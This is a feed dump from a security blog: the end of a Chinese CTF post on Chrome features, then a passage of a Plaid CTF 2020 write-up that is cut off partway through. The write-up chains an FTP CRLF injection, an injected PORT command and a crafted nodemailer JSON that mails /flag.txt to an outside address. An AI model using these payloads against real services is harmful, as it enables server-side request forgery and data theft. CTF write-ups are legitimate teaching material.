&#x76F8;&#x5173;&#x7684;&#x90E8;&#x5206;&#x8FD8;&#x6CA1;&#x6709;&#x5B8C;&#x5168;&#x5F04;&#x660E;&#x767D;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E2A;&#x9898;&#x4F5C;&#x8005;&#x8FD8;&#x662F;&#x6545;&#x610F;&#x5F15;&#x5165;&#x7684; uBlock &#x6765;&#x534F;&#x52A9;&#x6211;&#x4EEC;&#x505A;&#x9898;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x6BD4;&#x8F83;&#x7684;&#x53CB;&#x597D;&#x4E86;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x53EF;&#x80FD;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x5B8C;&#x5168; Get &#x5230;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x70B9;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x5BF9;&#x6211;&#x800C;&#x8A00;&#x66F4;&#x8BA9;&#x4EBA;&#x89C9;&#x5F97;&#x8033;&#x76EE;&#x4E00;&#x65B0;&#x7684;&#x662F; Chrome &#x65B0;&#x7279;&#x6027; Text Fragemnts &#xFF0C;&#x8BA9;&#x4EBA;&#x7814;&#x7A76;&#x7684;&#x66F4;&#x591A;&#x7684;&#x662F; User Activation &#x3002;</p><p>&#x867D;&#x7136;&#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x5BF9;&#x4E8E;&#x5B9E;&#x6218;&#x53EF;&#x80FD;&#x663E;&#x5F97;&#x9E21;&#x808B;&#xFF0C;&#x751A;&#x81F3;&#x201C;&#x6BEB;&#x65E0;&#x4F5C;&#x7528;&#x201D;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x7C7B;&#x9898;&#x76EE;&#x6211;&#x89C9;&#x5F97;&#x6253;&#x5F00;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x89C6;&#x91CE;&#xFF0C;&#x8BA9;&#x6211;&#x5173;&#x6CE8;&#x5230;&#x4E86;&#x66F4;&#x591A;&#x65B0;&#x4E1C;&#x897F;&#xFF0C;&#x66F4;&#x4F55;&#x51B5;&#x8FD9;&#x7C7B;&#x7684;&#x9898;&#x76EE;&#x5728;&#x56FD;&#x5185;&#x8FD8;&#x662F;&#x5F88;&#x5C11;&#x89C1;&#x5230;&#x7684;&#xFF0C;&#x6BD5;&#x7ADF;&#x5F04;&#x8FD9;&#x7C7B;&#x9898;&#x76EE;&#xFF0C;&#x4ECE;&#x4E3B;&#x8981;&#x653B;&#x51FB;&#x94FE;&#x6784;&#x9020;&#x5230;&#x7EC6;&#x8282;&#x8BBE;&#x7F6E;&#x90FD;&#x9700;&#x8981;&#x7CBE;&#x5FC3;&#x7684;&#x63E3;&#x6469;&#x4E0E;&#x63A8;&#x6572;&#xFF0C;&#x66F4;&#x4F55;&#x51B5;&#x662F;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x6CA1;&#x6709;&#x6DF1;&#x539A;&#x7684;&#x6280;&#x672F;&#x79EF;&#x6DC0;&#x51FA;&#x4E0D;&#x6765;&#x8FD9;&#x7C7B;&#x8BA9;&#x5168;&#x7403;&#x5927;&#x90E8;&#x5206; CTFer &#x7206;&#x96F6;&#x7684;&#x9AD8;&#x96BE;&#x5EA6;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x4E5F;&#x5E0C;&#x671B;&#x56FD;&#x5185;&#x4EE5;&#x540E;&#x80FD;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x8FD9;&#x7C7B;&#x9AD8;&#x8D28;&#x91CF;&#x7684;&#x9898;&#x76EE;&#x5427;&#x3002;</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a></p><p><a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a></p><p><a href="https://developers.google.com/web/updates/2019/01/user-activation" target="_blank" rel="noopener">Making user activation consistent across APIs</a></p><p><a href="https://docs.google.com/document/d/1mcxB5J_u370juJhSsmK0XQONG2CIE3mvu827O-Knw_Y/edit#heading=h.hy5wkxbrpq6o" target="_blank" rel="noopener">Existing Chrome APIs using user gestures</a></p><p><a href="https://github.com/dtapuska/useractivation" target="_blank" rel="noopener">JS API for querying User Activation</a></p><p><a href="https://mustaqahmed.github.io/user-activation-delegation/" target="_blank" rel="noopener">Activation Transfer through postMessages</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/</id>
        <title><![CDATA[Plaid CTF 2020 Contrived Web Problem Write Up]]></title>
        <updated>2021-02-12T10:29:56+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"><![CDATA[<html><head></head><body><p>Here is my write up of Contrived Web Problem in Plaid CTF 2020.</p><a id="more"></a><p>[TOC]</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>You can get the attachment of the chall in this <a href="https://github.com/ZeddYu/Plaid-CTF-2020-Web" target="_blank" rel="noopener">repo</a>.</p><ol><li>You can find CRLF in ftp then use CRLF to inject ftp command.</li><li>You can use PORT command to build a TCP connection with rabbitmq server.</li><li>Make a HTTP message which can let the nodemailer send a email containing the flag as a attachment to your email through rabbitmq web api.</li><li>Hide this HTTP message in a PNG. Upload the picture as your profile.</li><li>Use the REST command to cut the PNG and let PETR command return the HTTP message which is in the PNG to rabbitmq server.</li><li>Check FLAG in your email.</li></ol><h2 id="CRLF-in-FTP"><a href="#CRLF-in-FTP" class="headerlink" title="CRLF in FTP"></a>CRLF in FTP</h2><p>We guess there should be a CRLF in FTP at first. And use <code>%250d%250a</code> to test it because it use the following code.</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (parsed.protocol === <span class="hljs-string">&quot;ftp:&quot;</span>) {</span><br><span class="line">  <span class="hljs-keyword">let</span> username = <span class="hljs-built_in">decodeURIComponent</span>(parsed.username);</span><br><span class="line">  <span class="hljs-keyword">let</span> password = <span class="hljs-built_in">decodeURIComponent</span>(parsed.password);</span><br><span class="line">  <span class="hljs-keyword">let</span> filename = <span class="hljs-built_in">decodeURIComponent</span>(parsed.pathname);</span><br><span class="line">  <span class="hljs-keyword">let</span> ftpClient = <span class="hljs-keyword">await</span> connectFtp({</span><br><span class="line">    host: parsed.hostname,</span><br><span class="line">    port: parsed.port !== <span class="hljs-string">&quot;&quot;</span> ? <span class="hljs-built_in">parseInt</span>(parsed.port) : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    user: username !== <span class="hljs-string">&quot;&quot;</span> ? username : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    password: password !== <span class="hljs-string">&quot;&quot;</span> ? password : <span class="hljs-literal">undefined</span>,</span><br><span class="line">  });</span><br><span class="line">  image = <span class="hljs-keyword">await</span> ftpClient.get(filename);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Send this url through <code>api/image</code>.</p><p></p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/image?url=ftp://<span class="hljs-number">2</span>:<span class="hljs-number">2</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aPORT<span class="hljs-symbol">%20172</span>,<span class="hljs-number">32</span>,<span class="hljs-number">56</span>,<span class="hljs-number">72</span>,<span class="hljs-number">61</span>,<span class="hljs-number">56</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aREST<span class="hljs-symbol">%206</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aRETR<span class="hljs-symbol">%20</span><span class="hljs-symbol">%252</span>fuser<span class="hljs-symbol">%252</span>fb<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-symbol">%252</span>fprofile<span class="hljs-symbol">%252</span>epng<span class="hljs-title">@ftp</span>:<span class="hljs-number">21</span>/user/b<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a/profile.png</span><br></pre></td></tr></tbody></table></figure><p></p><p>This url will make a request like this.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/1.png" alt></p><p>So we get a CRLF now.</p><p>Or you can audit the code of ftp <a href="https://github.com/mscdex/node-ftp" target="_blank" rel="noopener">https://github.com/mscdex/node-ftp</a> then you can find it do nothing with CRLF.</p><h2 id="The-active-mode-of-FTP"><a href="#The-active-mode-of-FTP" class="headerlink" title="The active mode of FTP"></a>The active mode of FTP</h2><p>FTP have two modes, one is active and the other is passive.</p><blockquote><p>In <em>active</em> mode, the client establishes the command channel but the <em>server</em> is responsible for establishing the data channel. This can actually be a problem if, for example, the client machine is protected by firewalls and will not allow unauthorised session requests from external parties.</p><p>In <em>passive</em> mode, the client establishes <em>both</em> channels. We already know it establishes the command channel in active mode and it does the same here.</p></blockquote><p>If we don&#x2019;t inject code through CRLF, we can get the FTP traffic like this:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/2.png" alt></p><p>So it will use <code>PASV</code> command to open passive mode and build a connection with client.</p><p>Why not inject <code>PORT</code> commant through CRLF to let ftp-srv open active mode and let ftp-srv connect with my server?</p><p>Yeah. Just like this. I use <code>PORT</code> command to let ftp-srv connect with my server.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/plaid-ctf/1.png" alt></p><p>But if you try with <code>LIST</code> or something else following by <code>PORT</code> command, you can&#x2019;t get the response on your server. It&#x2019;s a bit strange that I still confused about it. If you know something about this, welcome to discuss.</p><h2 id="The-mail-server"><a href="#The-mail-server" class="headerlink" title="The mail server"></a>The mail server</h2><p>And how can we get flag? Use FTP? But the flag.txt is not on the ftp server. So we should think about how to get flag.</p><p>I notice there is a function that use to reset user&#x2019;s password.</p><p>services/api/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="hljs-string">&quot;/password-reset&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">let</span> { email } = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> email !== <span class="hljs-string">&quot;string&quot;</span>) {</span><br><span class="line">    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Bad body&quot;</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> newPassword = <span class="hljs-built_in">Array</span>.from(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">16</span>), <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span>[<span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">36</span>)]).join(<span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">  <span class="hljs-keyword">let</span> hashedPassword = <span class="hljs-keyword">await</span> bcrypt.hash(newPassword, <span class="hljs-number">14</span>);</span><br><span class="line">  <span class="hljs-keyword">await</span> withClient(<span class="hljs-function">(<span class="hljs-params">client</span>) =&gt;</span> client.query(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">UPDATE user_auth</span></span><br><span class="line"><span class="hljs-string">SET password = $2</span></span><br><span class="line"><span class="hljs-string">WHERE email = $1</span></span><br><span class="line"><span class="hljs-string">`</span>, [email, hashedPassword]));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">  channel.sendToQueue(<span class="hljs-string">&quot;email&quot;</span>, Buffer.from(<span class="hljs-built_in">JSON</span>.stringify({</span><br><span class="line">    to: email,</span><br><span class="line">    subject: <span class="hljs-string">&quot;Password Reset&quot;</span>,</span><br><span class="line">    text: <span class="hljs-string">`Hello there, your new password is <span class="hljs-subst">${newPassword}</span>`</span>,</span><br><span class="line">  })));</span><br><span class="line"></span><br><span class="line">  res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Password reset&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>It seems we can&#x2019;t control the <code>${newPassword}</code>. But I find a way to get flag through reading nodemailer&#x2019;s documentation.</p><p><a href="https://nodemailer.com/message/attachments/" target="_blank" rel="noopener">https://nodemailer.com/message/attachments/</a></p><p>We can send an email containing the flag as attachment! We can make a json like this:</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">&quot;to&quot;</span>:<span class="hljs-string">&quot;your@gmail.com&quot;</span>,<span class="hljs-attr">&quot;subject&quot;</span>:<span class="hljs-string">&quot;Password Reset&quot;</span>,<span class="hljs-attr">&quot;text&quot;</span>:<span class="hljs-string">&quot;Hello there, your new password is newpass&quot;</span>,<span class="hljs-attr">&quot;attachments&quot;</span>:[{<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-attr">&quot;path&quot;</span>:<span class="hljs-string">&quot;/flag.txt&quot;</span>}]}</span><br></pre></td></tr></tbody></table></figure><p></p><p>So what we need to do is to control nodemailer to send our message.</p><h2 id="rabbitmq"><a href="#rabbitmq" class="headerlink" title="rabbitmq"></a>rabbitmq</h2><p>services/email/index.ts</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> channel = <span class="hljs-keyword">await</span> rabbit.createChannel();</span><br><span class="line">channel.consume(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-keyword">async</span> (msg) =&gt; {</span><br><span class="line">  <span class="hljs-keyword">if</span> (msg === <span class="hljs-literal">null</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  channel.ack(msg);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">try</span> {</span><br><span class="line">    <span class="hljs-keyword">let</span> data = <span class="hljs-built_in">JSON</span>.parse(msg.content.toString());</span><br><span class="line">    <span class="hljs-keyword">await</span> transport.sendMail({</span><br><span class="line">      <span class="hljs-keyword">from</span>: <span class="hljs-string">&quot;plaid2020problem@gmail.com&quot;</span>,</span><br><span class="line">      subject: <span class="hljs-string">&quot;Your Account&quot;</span>,</span><br><span class="line">      ...data,</span><br><span class="line">    });</span><br><span class="line">  } <span class="hljs-keyword">catch</span> (e) {</span><br><span class="line">    <span class="hljs-built_in">console</span>.error(e);</span><br><span class="line">  }</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p></p><p>And we can find how server sendemail here. It uses rabbitmq. And rabbitmq has got web api. </p><p>So it seems we can control what nodemailer send through rabbitmq&#x2019;s web api.</p><p>But how can we send http request to rabbitmq? It seems we have got the method how to get flag and the method let ftp server build TCP connection with arbitrary server.</p><p>It seems we need a connection with them!</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF!"></a>SSRF!</h2><p>The last key to solve this problem is let the ftp server send a http request to rabbitmq server.</p><p>But how?</p><p>We notice that we can hide a http message in the profile png and use <code>RRETR</code> to let the ftp server return the message of png.</p><p><img 